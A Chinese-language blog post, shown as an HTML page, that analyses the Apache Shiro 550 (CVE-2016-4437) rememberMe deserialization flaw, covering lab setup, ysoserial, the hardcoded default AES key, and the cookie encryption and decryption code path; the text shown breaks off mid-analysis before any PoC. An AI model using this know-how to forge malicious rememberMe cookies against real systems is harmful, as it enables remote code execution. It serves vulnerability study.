<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Shiro 550 反序列化漏洞 详细分析&#43;poc编写 - 老帅的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://laoshuaiblog.github.io/posts/45ff093134f9d6c2beff343a2823f80f/">
  <meta property="og:site_name" content="老帅的博客">
  <meta property="og:title" content="Shiro 550 反序列化漏洞 详细分析&#43;poc编写">
  <meta property="og:description" content="0x00 前言 shiro反序列化漏洞这个从 shiro 550 开始，在2016年就爆出来, 但是到现在在各种攻防演练中也起到了显著作用
这个漏洞一直都很好用，特别是一些红蓝对抗HW的下边界突破很好用
遂研究一下这个漏洞的成因和分析一下代码
0x01 Shiro 550 漏洞描述 Apache Shiro RememberMe 反序列化导致的命令执行漏洞
Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理
编号：Shiro-550, CVE-2016-4437
版本：Apache Shiro (由于密钥泄露的问题, 部分高于1.2.4版本的Shiro也会受到影响)
0x02 环境搭建 基础环境 编辑器：IDEA 2020
java版本：jdk1.7.0_80
Server版本 : Tomcat 8.5.56
shiro版本：shiro-root-1.2.4
组件：commons-collections4
搭建过程 如果闲配置麻烦，也可以直接用我弄好的GitHub地址
https://github.com/godzeo/shiro_1.2.4_sample.git
正常搭建 直接下载：
https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4
下载好以后直接解压
然后偷偷的进入samples/web目录，直接修改pom文件，主要修改下面这些
... &amp;lt;dependencies&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;javax.servlet&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;jstl&amp;lt;/artifactId&amp;gt; &amp;lt;!-- 这里需要将jstl设置为1.2 --&amp;gt; &amp;lt;version&amp;gt;1.2&amp;lt;/version&amp;gt; &amp;lt;scope&amp;gt;runtime&amp;lt;/scope&amp;gt; &amp;lt;/dependency&amp;gt; ..... &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.apache.commons&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;commons-collections4&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;4.0&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependencies&amp;gt; 然后部署，我就直接使用IEDA 部署了
坑点： 如果有使用maven打包搭建的话，可能遇到
Failed to execute goal org.">
  <meta property="og:locale" content="zh-CN">
  <meta property="og:type" content="article">
  <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2020-09-03T18:51:50+08:00">
    <meta property="article:modified_time" content="2020-09-03T18:51:50+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="老帅的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">老帅的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Shiro 550 反序列化漏洞 详细分析&#43;poc编写</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="0x00__0"></a>0x00 前言</h2> 
<p>shiro反序列化漏洞这个从 shiro 550 开始，在2016年就爆出来, 但是到现在在各种攻防演练中也起到了显著作用</p> 
<p>这个漏洞一直都很好用，特别是一些红蓝对抗HW的下边界突破很好用</p> 
<p>遂研究一下这个漏洞的成因和分析一下代码</p> 
<h2><a id="0x01_Shiro_550__12"></a>0x01 Shiro 550 漏洞描述</h2> 
<p>Apache Shiro RememberMe 反序列化导致的命令执行漏洞</p> 
<p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理</p> 
<p>编号：Shiro-550, CVE-2016-4437</p> 
<p>版本：Apache Shiro (由于密钥泄露的问题, 部分高于1.2.4版本的Shiro也会受到影响)</p> 
<h2><a id="0x02__32"></a>0x02 环境搭建</h2> 
<h3><a id="_34"></a>基础环境</h3> 
<p>编辑器：IDEA 2020</p> 
<p>java版本：jdk1.7.0_80</p> 
<p>Server版本 : Tomcat 8.5.56</p> 
<p>shiro版本：shiro-root-1.2.4</p> 
<p>组件：commons-collections4</p> 
<h3><a id="_48"></a>搭建过程</h3> 
<p>如果闲配置麻烦，也可以直接用我弄好的GitHub地址</p> 
<p>https://github.com/godzeo/shiro_1.2.4_sample.git</p> 
<h4><a id="_55"></a>正常搭建</h4> 
<p>直接下载：</p> 
<p>https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</p> 
<p>下载好以后直接解压</p> 
<p>然后偷偷的进入samples/web目录，直接修改pom文件，主要修改下面这些</p> 
<pre><code class="prism language-java"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token generics function"><span class="token punctuation">&lt;</span>dependencies<span class="token punctuation">&gt;</span></span>
    <span class="token generics function"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>
        <span class="token generics function"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>javax<span class="token punctuation">.</span>servlet<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>
        <span class="token generics function"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>jstl<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>  这里需要将jstl设置为<span class="token number">1.2</span> <span class="token operator">--</span><span class="token operator">&gt;</span>
        <span class="token generics function"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">1.2</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>
        <span class="token generics function"><span class="token punctuation">&lt;</span>scope<span class="token punctuation">&gt;</span></span>runtime<span class="token operator">&lt;</span><span class="token operator">/</span>scope<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token generics function"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>
        <span class="token generics function"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>
        <span class="token generics function"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>commons<span class="token operator">-</span>collections4<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>
        <span class="token generics function"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">4.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>
<span class="token generics function"><span class="token punctuation">&lt;</span>dependencies<span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>然后部署，我就直接使用IEDA 部署了</p> 
<p><img src="https://images2.imgbox.com/a0/08/hpGH3hJ1_o.png" alt="image-20200903111130024"></p> 
<h3><a id="_89"></a>坑点：</h3> 
<p>如果有使用maven打包搭建的话，可能遇到</p> 
<pre><code>Failed to execute goal org.apache.maven.plugins:maven-toolchains-plugin:1.1:toolchain (default) on project samples-web: Misconfigured toolchains.
</code></pre> 
<p>这应该是maven打包这里要1.6的环境，但运行不影响</p> 
<p>需要修改 maven/conf/toolchains.xml 的代码：</p> 
<pre><code>&lt;toolchain&gt;
    &lt;type&gt;jdk&lt;/type&gt;
    &lt;provides&gt;
      &lt;version&gt;1.6&lt;/version&gt;
      &lt;vendor&gt;sun&lt;/vendor&gt;
    &lt;/provides&gt;
    &lt;configuration&gt;
      &lt;jdkHome&gt;/Library/Java/JavaVirtualMachines/1.6.0.jdk&lt;/jdkHome&gt;
    &lt;/configuration&gt;
&lt;/toolchain&gt;
</code></pre> 
<p>我们还需要产生payload的 ysoserial</p> 
<p>ysoserial项目源码在这里https://github.com/frohoff/ysoserial ，然后自己编译， 也可直接下载编译好的release。</p> 
<h2><a id="0x03__124"></a>0x03 代码分析</h2> 
<p>简单介绍一下漏洞：</p> 
<p>简单介绍利用：</p> 
<ul><li> <p>通过在cookie的rememberMe字段中插入恶意payload，</p> </li><li> <p>触发shiro框架的rememberMe的反序列化功能，导致任意代码执行。</p> </li><li> <p>shiro 1.2.24中，提供了硬编码的AES密钥：kPH+bIxk5D2deZiIxcaaaA==</p> </li><li> <p>由于开发人员未修改AES密钥而直接使用Shiro框架，导致了该问题</p> </li></ul> 
<h3><a id="_141"></a>加密过程</h3> 
<p>找入口点的话，就是这个漏洞一直提的硬编码地方下手，然后稍微回溯就找到，我们也只需关注rememberMe这个处理就好了</p> 
<p>首先找到/shiro-core-1.2.4.jar!/org/apache/shiro/mgt/AbstractRememberMeManager.class，该类位于shiro-core模块</p> 
<p>我们发现了，我们最常见的，常常提到的的key，那么入口点可能在这里</p> 
<pre><code class="prism language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> DEFAULT_CIPHER_KEY_BYTES <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/88/0b/tunD8oNY_o.png" alt="image-20200902093224310"></p> 
<ul><li>他是继承了RememberMeManager类，那么我们向上溯源：找到RememberMeManager类的onSuccessfulLogin方法，看名字就直接是登陆成功的处理</li><li>那我们下一个断点，研究一下这个rememberme的加密和处理流程，是个什么原理</li></ul> 
<p><img src="https://images2.imgbox.com/77/97/Xzp9nonb_o.png" alt="image-20200902100631808"></p> 
<p>所以我们登陆一下，debug开启！记得要勾选Remember Me哦</p> 
<p><img src="https://images2.imgbox.com/89/b7/77YofqMO_o.png" alt="image-20200902101329183"></p> 
<p>然后我们收到数据了，直接步入跟进</p> 
<p><img src="https://images2.imgbox.com/34/56/yiRkMunI_o.png" alt="image-20200902101419301"></p> 
<p>转入了forgetIdentity函数，处理request和response请求，继续跟进this.forgetIdentity方法，进入了</p> 
<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-EM2oRAEz-1599130237592)(…/Library/Application Support/typora-user-images/image-20200902102404236.png)]</p> 
<p>继续跟进this.forgetIdentity方法，进入了getCookie的removeFrom方法，跟进removeFrom方法</p> 
<pre><code class="prism language-java"><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getCookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">removeFrom</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/3a/63/7qNKYhh8_o.png" alt="image-20200902102418678"></p> 
<ul><li>这里获取看配置信息，最后addCookieHeader放到了返回包中的cookie头中，其中就有我们熟悉的，deleteMe字段和rememberMe字段，也就是我们指纹识别最简单的两种方法的原理</li></ul> 
<p><img src="https://images2.imgbox.com/14/df/ONoujZJN_o.png" alt="image-20200902103223302"></p> 
<ul><li>然后这一阶段结束了，随后回到刚刚的onSuccessfulLogin方法中，这个isRememberMe主要是检查选择了remember me这个按钮没有，随后步入 rememberIdentity 方法，看看做了什么</li></ul> 
<p><img src="https://images2.imgbox.com/cd/75/0QW5Yvtb_o.png" alt="image-20200902103501055"></p> 
<p>在rememberIdentity方法中，authcInfo的值就是我们输入root用户名，继续跟进rememberIdentity函数</p> 
<pre><code>PrincipalCollection principals = this.getIdentityToRemember(subject, authcInfo);
this.rememberIdentity(subject, principals);
</code></pre> 
<p><img src="https://images2.imgbox.com/32/f0/JiL3Ugf0_o.png" alt="image-20200902103806491"></p> 
<p>进入rememberIdentity方法后发现，一个函数就是转化为bytes，跟进convertPrincipalsToBytes</p> 
<pre><code class="prism language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">rememberIdentity</span><span class="token punctuation">(</span>Subject subject<span class="token punctuation">,</span> PrincipalCollection accountPrincipals<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">convertPrincipalsToBytes</span><span class="token punctuation">(</span>accountPrincipals<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">rememberSerializedIdentity</span><span class="token punctuation">(</span>subject<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/3d/06/ci78amsJ_o.png" alt="image-20200902104614572"></p> 
<ul><li>进入convertPrincipalsToBytes方法，发现它会序列化，而且序列化的是传入的root用户名</li><li>后续跟进看了一下，就是普通的序列化，没有什么特殊的操作，就不继续写了</li><li>然后调用encrypt方法加密序列化后的二进制字节</li><li>这个必须得跟进看一下encrypt方法吧</li></ul> 
<pre><code class="prism language-java"><span class="token keyword">protected</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">convertPrincipalsToBytes</span><span class="token punctuation">(</span>PrincipalCollection principals<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>principals<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        bytes <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> bytes<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>发现CipherService cipherService = this.getCipherService()，就是获取密码服务的意思，那么看一下获取了这么，看一结果发现是AES加密方法，而且是AES/CBC/PKCS5Padding</p> 
<pre><code class="prism language-java"><span class="token keyword">protected</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialized<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value <span class="token operator">=</span> serialized<span class="token punctuation">;</span>
    CipherService cipherService <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>cipherService <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        ByteSource byteSource <span class="token operator">=</span> cipherService<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>serialized<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getEncryptionCipherKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        value <span class="token operator">=</span> byteSource<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> value<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/02/78/F1aJN7v4_o.png" alt="image-20200902105639625"></p> 
<p>那么下一句话就是：加密这个传入的数据的方法了。</p> 
<p>再看这就话this.getEncryptionCipherKey()，明显这是获取秘钥了，直接跟进getEncryptionCipherKey</p> 
<pre><code class="prism language-java">ByteSource byteSource <span class="token operator">=</span> cipherService<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>serialized<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getEncryptionCipherKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>这个找key 就是在这个类中反复横跳，就可以找到，就详细看了：</p> 
<pre><code>this.encryptionCipherKey
setEncryptionCipherKey（）
setCipherKey(byte[] cipherKey)---setEncryptionCipherKey（）
this.setCipherKey(DEFAULT_CIPHER_KEY_BYTES)
</code></pre> 
<p>最终溯源到 getEncryptionCipherKey 就是开头中的 DEFAULT_CIPHER_KEY_BYTES，也就是我们一开始第一个提到的kPH+bIxk5D2deZiIxcaaaA==这个key</p> 
<p><img src="https://images2.imgbox.com/ea/91/evrQmpSd_o.png" alt="image-20200902110741059"></p> 
<p>随后就传入 encrypt函数（root ，刚刚获取的key），这时就加密方法了！！！</p> 
<pre><code class="prism language-java"><span class="token keyword">public</span> ByteSource <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> plaintext<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ivBytes <span class="token operator">=</span> null<span class="token punctuation">;</span>
  
   <span class="token comment">//生成初始化向量，随后 generate:TURE</span>
    <span class="token keyword">boolean</span> generate <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isGenerateInitializationVectors</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>generate<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
      	 
      	<span class="token comment">//产生初始化向量</span>
        ivBytes <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">generateInitializationVector</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      
      	<span class="token comment">//异常，不会进入的</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>ivBytes <span class="token operator">==</span> null <span class="token operator">||</span> ivBytes<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalStateException</span><span class="token punctuation">(</span><span class="token string">"Initialization vector generation is enabled - generated vectorcannot be null or empty."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
		<span class="token comment">//再跟进就是更加具体的方法了，基本的加密逻辑已知 序列化root key 然后还有iv</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> key<span class="token punctuation">,</span> ivBytes<span class="token punctuation">,</span> generate<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>加密后数据一直向上回溯，直到 rememberIdentity这个方法下有个 rememberSerializedIdentity方法要跟如，因为这个是记住序列化身份的功能</p> 
<p><img src="https://images2.imgbox.com/ad/4d/NJBlAwm4_o.png" alt="image-20200902113232687"></p> 
<p>跟如这个方法，就基本上到了加密的最后一步，把刚刚加密的数据base64，然后都加入到cookie里面</p> 
<p><img src="https://images2.imgbox.com/24/a5/Yq8WHTr2_o.png" alt="image-20200902113423550"></p> 
<h3><a id="_334"></a>解密过程：</h3> 
<p>现在继续研究解密过程：</p> 
<ul><li>首先确定切入点</li><li>我选择从获取到客户端数据开始分析 ，那就是 org.apache.shiro.mgt.AbstractRememberMeManager 类的 getRememberedPrincipals 方法下断点</li><li>随后在页面随便刷新一下，就可以触发这个方法</li></ul> 
<p>直接跟进 getRememberedSerializedIdentity(subjectContext) 方法，看看从数据中，都获取了什么</p> 
<p><img src="https://images2.imgbox.com/9d/ed/4taLeFGZ_o.png" alt="image-20200902140120404"></p> 
<p>这个getRememberedSerializedIdentity方法中 有一个this.getCookie().readValue(request, response)</p> 
<p>这是要读取cookice中的数据了，这必须跟入了</p> 
<p><img src="https://images2.imgbox.com/6a/3b/SAclHkEs_o.png" alt="image-20200902140447964"></p> 
<p>然后 readValue 方法，根据 Cookie 中的 name 字段（这个字段就是 rememberMe）获取 Cookie 的值</p> 
<p>最终把获取cookie里面的rememberme 给到 value 返回上一级函数</p> 
<p><img src="https://images2.imgbox.com/47/d4/BlhcPVz3_o.png" alt="image-20200902141852472"></p> 
<p>回到getRememberedSerializedIdentity方法中，使用base64解密，成为二进制的数据，继续向上传递</p> 
<pre><code>byte[] decoded = Base64.decode(base64);
</code></pre> 
<ul><li> <p>再次回到AbstractRememberMeManager 类</p> </li><li> <p>下一个流程就是 convertBytesToPrincipals 方法，这就是对应加密的解析数据，中间肯定要解密数据，继续跟入</p> <p><img src="https://images2.imgbox.com/64/cb/UWGDVIis_o.png" alt="image-20200902142717154"></p> </li></ul> 
<p>进入发现了 decrypt（）函数，这就很明显就进行解密了，继续跟入</p> 
<pre><code class="prism language-java"><span class="token keyword">protected</span> PrincipalCollection <span class="token function">convertBytesToPrincipals</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">,</span> SubjectContext subjectContext<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        bytes <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/c1/9c/Msqf6J27_o.png" alt="image-20200902142945142"></p> 
<h4><a id="decrypt_406"></a>详细看看decrypt解密函数：</h4> 
<pre><code class="prism language-java">    <span class="token keyword">protected</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encrypted<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialized <span class="token operator">=</span> encrypted<span class="token punctuation">;</span>
        CipherService cipherService <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>cipherService <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            ByteSource byteSource <span class="token operator">=</span> cipherService<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDecryptionCipherKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            serialized <span class="token operator">=</span> byteSource<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> serialized<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre> 
<p>getCipherService();老熟人了，获取加密方法：AES/CBC/PKCS5Padding</p> 
<p><img src="https://images2.imgbox.com/51/ab/4Oiz0dhA_o.png" alt="image-20200902143418030"></p> 
<p>最后到这句话，获取老朋友AES的秘钥 getDecryptionCipherKey()后，带着秘文和AES公钥进入decrypt函数</p> 
<pre><code class="prism language-java">ByteSource byteSource <span class="token operator">=</span> cipherService<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDecryptionCipherKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>跟进到了JcaCipherService的decrypt函数里面：分析一下里面的逻辑</p> 
<pre><code class="prism language-java"><span class="token keyword">public</span> ByteSource <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ciphertext<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key<span class="token punctuation">)</span> <span class="token keyword">throws</span> CryptoException <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encrypted <span class="token operator">=</span> ciphertext<span class="token punctuation">;</span>
    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> iv <span class="token operator">=</span> null<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isGenerateInitializationVectors</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">int</span> ivSize <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getInitializationVectorSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> ivByteSize <span class="token operator">=</span> ivSize <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span>
            iv <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span>ivByteSize<span class="token punctuation">]</span><span class="token punctuation">;</span>
          	
          	<span class="token comment">//ivByteSize=16</span>
          	<span class="token comment">//ciphertext这个数组 0-16位 覆盖到 iv数组 ，相当于给 vi赋值 ciphertext的前16位</span>
            System<span class="token punctuation">.</span><span class="token function">arraycopy</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> iv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> ivByteSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
          
          	<span class="token comment">// </span>
            <span class="token keyword">int</span> encryptedSize <span class="token operator">=</span> ciphertext<span class="token punctuation">.</span>length <span class="token operator">-</span> ivByteSize<span class="token punctuation">;</span>
            encrypted <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span>encryptedSize<span class="token punctuation">]</span><span class="token punctuation">;</span>
          	
           	<span class="token comment">// ciphertext数组 ，从 16位后面的数据 赋值给encrypted </span>
            System<span class="token punctuation">.</span><span class="token function">arraycopy</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> ivByteSize<span class="token punctuation">,</span> encrypted<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> encryptedSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
          
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var8<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
